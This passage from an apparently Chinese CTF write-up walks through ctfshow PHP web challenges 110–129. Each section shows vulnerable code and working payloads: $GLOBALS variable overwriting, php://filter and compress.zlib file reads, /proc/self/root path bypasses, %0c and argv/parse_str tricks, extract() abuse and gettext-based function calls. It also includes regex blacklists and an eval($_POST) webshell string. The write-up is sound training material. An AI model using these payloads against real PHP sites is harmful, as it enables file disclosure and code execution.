class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);    &#125;    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);    &#125;    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);&#125;<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#FilesystemIterator类读取文件?v1=FilesystemIterator&amp;v2=getcwd</span></span><br></pre></td></tr></table></figure><h2 id="1-20-Web-111-—-变量覆盖-—-GLOBALS"><a href="#1-20-Web-111-—-变量覆盖-—-GLOBALS" class="headerlink" title="1.20 Web 111 — 变量覆盖 — $GLOBALS"></a>1.20 Web 111 — 变量覆盖 — $GLOBALS</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">变量覆盖</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);error_reporting(<span class="number">0</span>);<span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);    var_dump(<span class="variable">$$v1</span>);&#125;<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);    &#125;    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);    &#125;    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;            getFlag(<span class="variable">$v1</span>,<span class="variable">$v2</span>);    &#125;    &#125;<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>超全局变量 <code>$GLOBALS</code></p><ul><li><p>$GLOBALS — 引用全局作用域中可用的全部变量</p></li><li><p>一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p></li></ul><p><img src="https://i.loli.net/2021/08/02/lk3Cv7n8eOghUxq.png" alt="image-20210802083706337"></p><p><img src="https://i.loli.net/2021/08/02/jsdzfwvOeMl69aU.png" alt="image-20210802083840803"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(8) &#123;  [<span class="string">&quot;_GET&quot;</span>]=&gt;  array(0) &#123;  &#125;  [<span class="string">&quot;_POST&quot;</span>]=&gt;  array(0) &#123;  &#125;  [<span class="string">&quot;_COOKIE&quot;</span>]=&gt;  array(0) &#123;  &#125;  [<span class="string">&quot;_FILES&quot;</span>]=&gt;  array(0) &#123;  &#125;  [<span class="string">&quot;GLOBALS&quot;</span>]=&gt;  array(8) &#123;    [<span class="string">&quot;_GET&quot;</span>]=&gt;    array(0) &#123;    &#125;    [<span class="string">&quot;_POST&quot;</span>]=&gt;    array(0) &#123;    &#125;    [<span class="string">&quot;_COOKIE&quot;</span>]=&gt;    array(0) &#123;    &#125;    [<span class="string">&quot;_FILES&quot;</span>]=&gt;    array(0) &#123;    &#125;    [<span class="string">&quot;GLOBALS&quot;</span>]=&gt;    *RECURSION*    [<span class="string">&quot;a&quot;</span>]=&gt;    int(123)    [<span class="string">&quot;b&quot;</span>]=&gt;    int(456)    [<span class="string">&quot;c&quot;</span>]=&gt;    string(4) <span class="string">&quot;asdf&quot;</span>  &#125;  [<span class="string">&quot;a&quot;</span>]=&gt;  int(123)  [<span class="string">&quot;b&quot;</span>]=&gt;  int(456)  [<span class="string">&quot;c&quot;</span>]=&gt;  string(4) <span class="string">&quot;asdf&quot;</span>&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload?v1=ctfshow&amp;v2=GLOBALS# 将 $GLOBALS 赋值给 v2 , v2 再赋值给 v1 , 然后再 var_dump($v1)，就相当于 var_dump($GLOBALS)</span></span><br></pre></td></tr></table></figure><h2 id="1-21-Web-112-—-各种编码绕过-convert-iconv-UCS-2LE-UCS-2BE"><a href="#1-21-Web-112-—-各种编码绕过-convert-iconv-UCS-2LE-UCS-2BE" class="headerlink" title="1.21 Web 112 — 各种编码绕过 convert.iconv.UCS-2LE.UCS-2BE"></a>1.21 Web 112 — 各种编码绕过 convert.iconv.UCS-2LE.UCS-2BE</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);error_reporting(0);<span class="keyword">function</span> filter(<span class="variable">$file</span>)&#123;    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;        die(<span class="string">&quot;hacker!&quot;</span>);    &#125;<span class="keyword">else</span>&#123;        <span class="built_in">return</span> <span class="variable">$file</span>;    &#125;&#125;<span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];<span class="keyword">if</span>(! is_file(<span class="variable">$file</span>))&#123;    highlight_file(filter(<span class="variable">$file</span>));&#125;<span class="keyword">else</span>&#123;    <span class="built_in">echo</span> <span class="string">&quot;hacker!&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpecho iconv(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>,<span class="string">&#x27;&lt;?php @eval($_POST[ab]);?&gt;&#x27;</span>);<span class="comment"># ?&lt;hp pe@av(l_$OPTSa[]b;)&gt;?</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload?file=php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php# 得到 f$al=gc&quot;fthswod&#123;3c00bd-8cf124-2b-53b4da-72598e1bb4&#125;7;&quot;# 解码得到 flag</span></span><br></pre></td></tr></table></figure><p><a href="https://www.php.net/manual/zh/mbstring.supported-encodings.php">https://www.php.net/manual/zh/mbstring.supported-encodings.php</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 另解?file=php://filter/resource=flag.php?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php?file=compress.zlib://flag.php#?file=compress.bzip2://flag.php# 别的一些编码绕过?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php?file=compress.zlib://flag.php?file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php</span></span><br></pre></td></tr></table></figure><h2 id="1-22-Web-113-—-proc-self-root-多次重复"><a href="#1-22-Web-113-—-proc-self-root-多次重复" class="headerlink" title="1.22 Web 113 — /proc/self/root 多次重复"></a>1.22 Web 113 — /proc/self/root 多次重复</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);error_reporting(0);<span class="keyword">function</span> filter(<span class="variable">$file</span>)&#123;    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;        die(<span class="string">&#x27;hacker!&#x27;</span>);    &#125;<span class="keyword">else</span>&#123;        <span class="built_in">return</span> <span class="variable">$file</span>;    &#125;&#125;<span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];<span class="keyword">if</span>(! is_file(<span class="variable">$file</span>))&#123;    highlight_file(filter(<span class="variable">$file</span>));&#125;<span class="keyword">else</span>&#123;    <span class="built_in">echo</span> <span class="string">&quot;hacker!&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过滤 filter 可使用 zlib?file=compress.zlib://flag.php</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 另解?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php# /proc/self/root 在 Linux 当中是指向根目录的  多次重复可绕过# ls /proc/self/root 得到的将会是根目录的文件</span></span><br></pre></td></tr></table></figure><h2 id="1-23-Web-114-—-filter"><a href="#1-23-Web-114-—-filter" class="headerlink" title="1.23 Web 114 — filter"></a>1.23 Web 114 — filter</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);<span class="keyword">function</span> filter(<span class="variable">$file</span>)&#123;  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;        die(<span class="string">&#x27;hacker!&#x27;</span>);    &#125;<span class="keyword">else</span>&#123;        <span class="built_in">return</span> <span class="variable">$file</span>;    &#125;&#125;<span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];<span class="built_in">echo</span> <span class="string">&quot;师傅们居然tql都是非预期 哼！&quot;</span>;<span class="keyword">if</span>(! is_file(<span class="variable">$file</span>))&#123;    highlight_file(filter(<span class="variable">$file</span>));&#125;<span class="keyword">else</span>&#123;    <span class="built_in">echo</span> <span class="string">&quot;hacker!&quot;</span>;&#125; 师傅们居然tql都是非预期 哼！</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># filter 未被过滤?file=php://filter/resource=flag.php</span></span><br></pre></td></tr></table></figure><h2 id="1-24-Web-115-—-trim-0c-绕过"><a href="#1-24-Web-115-—-trim-0c-绕过" class="headerlink" title="1.24 Web 115 — trim() %0c 绕过"></a>1.24 Web 115 — trim() %0c 绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpinclude(<span class="string">&#x27;flag.php&#x27;</span>);highlight_file(__FILE__);error_reporting(0);<span class="keyword">function</span> filter(<span class="variable">$num</span>)&#123;    <span class="variable">$num</span>=str_replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);    <span class="variable">$num</span>=str_replace(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);    <span class="variable">$num</span>=str_replace(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);    <span class="variable">$num</span>=str_replace(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);    <span class="variable">$num</span>=str_replace(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);    <span class="built_in">return</span> <span class="variable">$num</span>;&#125;<span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];<span class="keyword">if</span>(is_numeric(<span class="variable">$num</span>) and <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> and trim(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> and filter(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;        <span class="built_in">echo</span> <span class="variable">$flag</span>;    &#125;<span class="keyword">else</span>&#123;        <span class="built_in">echo</span> <span class="string">&quot;hacker!!&quot;</span>;    &#125;&#125;<span class="keyword">else</span>&#123;    <span class="built_in">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;&#125; hacker!!!</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/02/DmW7bvf2sIPgEi3.png" alt="image-20210802092037807"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 测试&lt;?phpfor ($i=0; $i &lt;=128 ; $i++) &#123;     $x=chr($i).&#x27;1&#x27;;   if(trim($x)!==&#x27;1&#x27; &amp;&amp;  is_numeric($x))&#123;        echo urlencode(chr($i)).&quot;\n&quot;;   &#125;&#125;# %0C %2B - . 0 1 2 3 4 5 6 7 8 9 </span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=%0c36</span><br></pre></td></tr></table></figure><h2 id="1-25-Web-123-—-a-SERVER-‘argv’"><a href="#1-25-Web-123-—-a-SERVER-‘argv’" class="headerlink" title="1.25 Web 123 — $a=$_SERVER[‘argv’];"></a>1.25 Web 123 — $a=$_SERVER[‘argv’];</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);include(<span class="string">&quot;flag.php&quot;</span>);<span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];<span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;isset(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!isset(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=18)&#123;         <span class="built_in">eval</span>(<span class="string">&quot;<span class="variable">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);           <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;             <span class="built_in">echo</span> <span class="variable">$flag</span>;         &#125;    &#125;&#125;?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 变量名应该只有 字母、数字、下划线# GET 或 POST方式传进去的变量名,会自动将 空格 + . [ 转换为 _ ，重点是 仅仅替换一次</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payloadfun=echo $flag&amp;CTF_SHOW=1&amp;CTF[SHOW.COM=2fun=$fl0g=%27flag_give_me%27&amp;CTF_SHOW=1&amp;CTF[SHOW.COM=2#不行CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=var_dump($GLOBALS)#不行</span></span><br></pre></td></tr></table></figure><p><strong>$a=$_SERVER[‘argv’];</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1、cli模式（命令行）下第一个参数<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>][0]是脚本名，其余的是传递给脚本的参数2、web网页模式下在web页模式下必须在php.ini开启register_argc_argv配置项    设置register_argc_argv = On(默认是Off)，重启服务，<span class="variable">$_SERVER</span>[‘argv’]才会有效果    这时候的<span class="variable">$_SERVER</span>[‘argv’][0] = <span class="variable">$_SERVER</span>[‘QUERY_STRING’]    <span class="variable">$argv</span>,<span class="variable">$argc</span>在web模式下不适用</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 预期解get: ?a=1+fl0g=flag_give_mepost: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])# 测试&lt;?php$a=$_SERVER[&#x27;argv&#x27;];var_dump($a);传入 a=1+fl0g=flag_give_me结果如下array(2) &#123; [0]=&gt; string(3) &quot;a=1&quot; [1]=&gt; string(17) &quot;fl0g=flag_give_me&quot; &#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 另解POST CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=eval($a[0])GET /?$fl0g=flag_give_meGET:?$fl0g=flag_give_mePOST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=assert($a[0])</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 测试 Web php.ini开启register_argc_argv配置项 | 设置register_argc_argv = On</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/01/ryjIeQWb8ZNisG4.png" alt="image-20210802110015478"></p><p><img src="https://i.loli.net/2021/08/02/58yCAMVZ7b1dK9N.png" alt="image-20210802110039649"></p><h2 id="1-26-Web-125-—-a-SERVER-‘argv’"><a href="#1-26-Web-125-—-a-SERVER-‘argv’" class="headerlink" title="1.26 Web 125 — $a=$_SERVER[‘argv’];"></a>1.26 Web 125 — $a=$_SERVER[‘argv’];</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);include(<span class="string">&quot;flag.php&quot;</span>);<span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];<span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;isset(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!isset(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=16)&#123;         <span class="built_in">eval</span>(<span class="string">&quot;<span class="variable">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;             <span class="built_in">echo</span> <span class="variable">$flag</span>;         &#125;    &#125;&#125;?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get: ?a=1+fl0g=flag_give_mepost: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str(<span class="variable">$a</span>[1])</span><br></pre></td></tr></table></figure><h2 id="1-27-Web-126-—-a-SERVER-‘argv’"><a href="#1-27-Web-126-—-a-SERVER-‘argv’" class="headerlink" title="1.27 Web 126 — $a=$_SERVER[‘argv’];"></a>1.27 Web 126 — $a=$_SERVER[‘argv’];</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);include(<span class="string">&quot;flag.php&quot;</span>);<span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];<span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;isset(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!isset(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;</span>, <span class="variable">$c</span>) &amp;&amp; strlen(<span class="variable">$c</span>)&lt;=16)&#123;         <span class="built_in">eval</span>(<span class="string">&quot;<span class="variable">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);           <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;             <span class="built_in">echo</span> <span class="variable">$flag</span>;         &#125;    &#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get: ?a=1+fl0g=flag_give_mepost: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str(<span class="variable">$a</span>[1])</span><br></pre></td></tr></table></figure><h2 id="1-28-Web-127-—-extract-GET-和-空格-绕过"><a href="#1-28-Web-127-—-extract-GET-和-空格-绕过" class="headerlink" title="1.28 Web 127 — extract($_GET); 和 空格 绕过 _"></a>1.28 Web 127 — extract($_GET); 和 空格 绕过 <code>_</code></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);include(<span class="string">&quot;flag.php&quot;</span>);highlight_file(__FILE__);<span class="variable">$ctf_show</span> = md5(<span class="variable">$flag</span>);<span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];//特殊字符检测<span class="keyword">function</span> waf(<span class="variable">$url</span>)&#123;    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;</span>|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//<span class="string">&#x27;, $url))&#123;        return true;    &#125;else&#123;        return false;    &#125;&#125;if(waf($url))&#123;    die(&quot;嗯哼？&quot;);&#125;else&#123;    extract($_GET);&#125;if($ctf_show===&#x27;</span>ilove36d<span class="string">&#x27;)&#123;    echo $flag;&#125;</span></span><br></pre></td></tr></table></figure><p>‘QUERY_STRING’</p><p>query string（查询字符串），如果有的话，通过它进行页面访问。</p><p><a href="https://www.php.net/manual/zh/reserved.variables.server.php">https://www.php.net/manual/zh/reserved.variables.server.php</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># + [ . 空格 会变成 _ # extract($_GET); 的作用即是将我们的 GET 传入的参数变成实打实的变量?ctf show=ilove36d</span></span><br></pre></td></tr></table></figure><h2 id="1-29-Web-128-—-gettext-扩展-—-get-defined-vars"><a href="#1-29-Web-128-—-gettext-扩展-—-get-defined-vars" class="headerlink" title="1.29 Web 128 — gettext 扩展 — get_defined_vars()"></a>1.29 Web 128 — gettext 扩展 — get_defined_vars()</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);include(<span class="string">&quot;flag.php&quot;</span>);highlight_file(__FILE__);<span class="variable">$f1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f1&#x27;</span>];<span class="variable">$f2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f2&#x27;</span>];<span class="keyword">if</span>(check(<span class="variable">$f1</span>))&#123;    var_dump(call_user_func(call_user_func(<span class="variable">$f1</span>,<span class="variable">$f2</span>)));&#125;<span class="keyword">else</span>&#123;    <span class="built_in">echo</span> <span class="string">&quot;嗯哼？&quot;</span>;&#125;<span class="keyword">function</span> check(<span class="variable">$str</span>)&#123;    <span class="built_in">return</span> !preg_match(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="variable">$str</span>);&#125; NULL</span><br></pre></td></tr></table></figure><p><strong>gettext 扩展</strong></p><ul><li>查看php 扩展目录下是否有 <code>php_gettext.dll</code></li><li>修改 <code>php.ini</code>     <code>extension=php_gettext.dll</code> 去掉注释</li></ul><p><img src="https://i.loli.net/2021/08/02/VJki8tAr4S25wo1.png" alt="image-20210802111723747"></p><p><img src="https://i.loli.net/2021/08/02/qVudQDK9zj1y8iP.png" alt="image-20210802111900412"></p><p><a href="https://www.cnblogs.com/lost-1987/articles/3309693.html">php 下的 gettext 扩展使用</a></p><p>测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpecho gettext(<span class="string">&#x27;phpinfo&#x27;</span>);<span class="built_in">echo</span> _(<span class="string">&#x27;phpinfo&#x27;</span>);?&gt;<span class="comment"># 如果是未定义的字符，则将会返回原字符串root@kali:/var/www/html/learn# vi 3.phproot@kali:/var/www/html/learn# php 3.php phpinfophpinfo</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get_defined_vars( void) : array返回由所有已定义变量所组成的数组 <span class="comment"># 测试&lt;?php$a = get_defined_vars();print_r($a);?&gt;# 返回Array(    [_GET] =&gt; Array        (            [ctfshow] =&gt; ilove36d        )    [_POST] =&gt; Array        (        )    [_COOKIE] =&gt; Array        (        )    [_FILES] =&gt; Array        (        )    [test] =&gt; Success!)</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/02/y2R1eQ6kUjBhsAw.png" alt="image-20210802113056976"></p><p><img src="https://i.loli.net/2021/08/02/gzAUSiO4LIex8pJ.png" alt="image-20210802112724073"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f1=_&amp;f2=get_defined_vars<span class="comment"># 解释var_dump(call_user_func(call_user_func($f1,$f2)));var_dump(call_user_func(call_user_func(&#x27;_&#x27;,&#x27;get_defined_vars&#x27;)));var_dump(call_user_func(get_defined_vars));</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/02/pji4IDPfbUcwMG6.png" alt="image-20210802113207015"></p><h2 id="1-30-Web-129-—-GET-中必须含有某内容"><a href="#1-30-Web-129-—-GET-中必须含有某内容" class="headerlink" title="1.30 Web 129 — GET 中必须含有某内容"></a>1.30 Web 129 — GET 中必须含有某内容</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);<span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;    <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];    <span 